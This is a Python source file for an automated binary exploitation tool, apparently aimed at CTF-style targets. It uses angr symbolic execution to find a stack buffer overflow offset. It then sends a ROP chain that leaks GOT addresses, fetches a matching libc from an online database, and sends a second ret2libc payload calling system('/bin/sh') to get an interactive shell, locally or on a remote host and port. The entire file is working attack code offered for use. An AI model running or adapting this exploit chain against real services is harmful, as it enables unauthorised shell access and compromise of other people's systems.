import angr
from angr import sim_options as so
import claripy
import timeout_decorator
from pwn import *
import requests
from bs4 import BeautifulSoup
import os
import shutil
from utils.database import Database

class Exploit(Database):
	def __init__(self, dict):
		self.ip = dict.get("ip")
		self.port = dict.get("port")
		self.is_printable= dict.get("is_printable")
		self.binary_name = dict.get("binary")
		self.elf = ELF(dict.get("binary"))
		self.offset_leaking = self.elf.process()
		self.rop = ROP(self.elf)
		self.url_find_libc = "https://libc.blukat.me/?q="
		self.url_download_libc = "https://libc.blukat.me/d/"
		Database.__init__(self, dict.get("binary"), self.elf.aslr)
		if not self.pwn_state:
			self.add_basics()
			self.prep_md5sum()
		if self.ip is not None and self.port is not None:
			try:
				self.p = remote(self.ip,self.port)
			except Exception as e:
				log.warning(e)
				log.warning("Couldn't connect... Aborting.")
				exit(-1)
		else:
			self.p = self.elf.process()
		context.arch = dict.get("arch") or "amd64"

	def recovery(self, instance, message, *args, exception=Exception, callback=lambda: None):
		try:
			instance.call(*args)
		except exception:
			log.warning(message)
			callback()

	def overflow_detect_filter(self, simgr):
		for state in simgr.unconstrained:
			bits = state.arch.bits
			num_count = bits / 8
			pc_value = b"C" * int(num_count)
			if state.solver.satisfiable(extra_constraints=[state.regs.pc == pc_value]):
				state.add_constraints(state.regs.pc == pc_value)
				user_input = state.globals["user_input"]
				log.info("Found vulnerable state.")
				if self.is_printable:
					log.info("Constraining input to be printable")
					for c in user_input.chop(8):
						constraint = claripy.And(c > 0x2F, c < 0x7F)
						if state.solver.satisfiable([constraint]):
							state.add_constraints(constraint)

				input_bytes = state.solver.eval(user_input, cast_to=bytes)
				log.info("[+] Vulnerable path found {}".format(input_bytes))
				if b"CCCC" in input_bytes:
					log.info("[+] Offset to bytes : {}".format(input_bytes.index(b"CCCC")))
				state.globals["offset"] = input_bytes.index(b"CCCC")
				state.globals["input"] = input_bytes
				simgr.stashes["found"].append(state)
				simgr.stashes["unconstrained"].remove(state)
				break
		return simgr

	def checkOverflow(self, binary_name, inputType="STDIN"):
		extras = {
			so.REVERSE_MEMORY_NAME_MAP,
			so.TRACK_ACTION_HISTORY,
			so.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
			so.SYMBOL_FILL_UNCONSTRAINED_REGISTERS,
		}

		class hookFour(angr.SimProcedure):
			IS_FUNCTION = True

			def run(self):
				return 4  

		p = angr.Project(binary_name, load_options={"auto_load_libs": False})
		p.hook_symbol("rand", hookFour)
		p.hook_symbol("srand", hookFour)

		argv = [binary_name]
		input_arg = claripy.BVS("input", 300 * 8)
		if inputType == "STDIN":
			state = p.factory.full_init_state(args=argv, stdin=input_arg)
			state.globals["user_input"] = input_arg
		elif inputType == "LIBPWNABLE":
			handle_connection = p.loader.main_object.get_symbol("handle_connection")
			state = p.factory.entry_state(
				addr=handle_connection.rebased_addr, stdin=input_arg, add_options=extras
			)
			state.globals["user_input"] = input_arg
		else:
			argv.append(input_arg)
			state = p.factory.full_init_state(args=argv)
			state.globals["user_input"] = input_arg

		state.libc.buf_symbolic_bytes = 0x100
		state.globals["inputType"] = inputType
		simgr = p.factory.simgr(state, save_unconstrained=True)

		run_environ = {}
		run_environ["offset"] = None
		end_state = None
		try:
			@timeout_decorator.timeout(120)
			def exploreBinary(simgr):
				simgr.explore(
					find=lambda s: "offset" in s.globals, step_func=self.overflow_detect_filter
				)
			exploreBinary(simgr)
			if "found" in simgr.stashes and len(simgr.found):
				end_state = simgr.found[0]
				run_environ["offset"] = end_state.globals["offset"]
		except (KeyboardInterrupt, timeout_decorator.TimeoutError) as e:
			log.info("[~] Keyboard Interrupt")
		if "input" in run_environ.keys():
			run_environ["input"] = end_state.globals["input"]
			log.info("[+] Triggerable with input : {}".format(end_state.globals["input"]))
		return run_environ

	def payload_generator(self, instance, offset):
		payload = [
			b"A"*offset,
			instance.chain()
		]
		payload = b"".join(payload)
		if instance == self.rop:
			if len(payload) % 16 != 0:
				log.info("Payload not aligned... Aligning it.")
				rop2 = ROP(self.elf)
				available_funcs = tuple(name for name in self.elf.got.keys() if name in ['puts', 'gets', 'printf', 'read', '__libc_start_main'])
				for func in available_funcs:
					self.recovery(rop2,f"No {func} in GOT", self.elf.symbols["puts"], [self.elf.got[func]])
				self.recovery(rop2, "Couldn't find ret", rop2.find_gadget(["ret"])[0])
				self.recovery(rop2,f"No main found...", self.elf.symbols["main"])
				payload2 = [
					b"A"*offset,
					rop2.chain()
				]
				payload2 = b"".join(payload2)
				return payload2
			else: return payload
		else:
			if len(payload) % 16 != 0:
				self.recovery(self.roplibc, "Couldn't find ret", self.roplibc.find_gadget(["ret"]))
				self.recovery(self.roplibc, "Didn't found system...","system",[ next(self.libc.search(b"/bin/sh\x00")) ])
				self.recovery(self.roplibc,"Didn't found exit...","exit")
				payload2 = [
					b"A"*offset,
					self.roplibc.chain()
				]
				payload2 = b"".join(payload2)
				return payload2
			else: return payload

	def join_cwd(self, path):
		return os.path.join(os.getcwd(), path)

	def main(self):
		overflow_result = self.checkOverflow(self.binary_name)
		offset = overflow_result.get("offset")
		self.add_offset(offset)
		self.p.recvline()
		log.info("Leaking available address...")

		available_funcs = tuple(name for name in self.elf.got.keys() if name in ['puts', 'gets', 'printf', 'read', '__libc_start_main'])
		for func in available_funcs:
			self.recovery(self.rop,f"No {func} in GOT", self.elf.symbols["puts"], [self.elf.got[func]])
		self.recovery(self.rop,f"No main found...", self.elf.symbols["main"])
		payload1 = self.payload_generator(self.rop,offset)
		self.add_p1(payload1)
		self.p.sendline(payload1)
		leaked_addr_list = []
		self.p.recv()

		for name in available_funcs: 
			leaked = u64(self.p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
			log.info(f"{name} @ {hex(leaked)}")
			name_leaked = name+":"+hex(leaked)
			leaked_addr_list.append(name_leaked)
		
		log.info("Looking for a libc...")
		leaked_addr = ",".join(leaked_addr_list)
		page = requests.get(self.url_find_libc+leaked_addr)
		soup = BeautifulSoup(page.content,"html.parser")
		scrap = soup.find(class_="lib-item")
		if scrap == None:
			log.warning("Libc not found... Aborting")
			exit(-1)
		libc_found = "".join(scrap.text.split()) + ".so"
		log.info("Found a LIBC that could work (found it on https://libc.blukat.me/).")
		log.info("Testing with following LIBC: " + libc_found)
		
		if libc_found != "":
			if (libc_found) not in os.listdir('./libc/'):
				log.info("Downloading libc... Could take some time depending of your internet")
				req = requests.get(self.url_download_libc+libc_found, allow_redirects=True)
				open(libc_found,'wb').write(req.content)
				LIBC = "./libc/" + str(libc_found)
				self.add_libc(LIBC)
				src = self.join_cwd(libc_found)
				to = self.join_cwd(os.path.join("libc", libc_found))
				shutil.move(src, to)
			else:
				log.info('LIBC already downloaded previously')
				LIBC = "./libc/" + str(libc_found)
				self.add_libc(LIBC)
			if LIBC:
				self.libc = ELF(LIBC) 
				self.libc.address = leaked - self.libc.symbols[available_funcs[-1]]
				log.info(f"base libc @ {hex(self.libc.address)}")
		else:
			log.warning("Couldn't find LIBC... Aborting.")
			exit(-1)

		self.roplibc = ROP(self.libc)
		self.recovery(self.roplibc, "Didn't found system...","system",[ next(self.libc.search(b"/bin/sh\x00")) ])
		self.recovery(self.roplibc,"Didn't found exit...","exit")

		payload2 = self.payload_generator(self.roplibc, offset)

		self.add_p2(payload2)
		self.p.sendline(payload2)
		self.p.interactive()
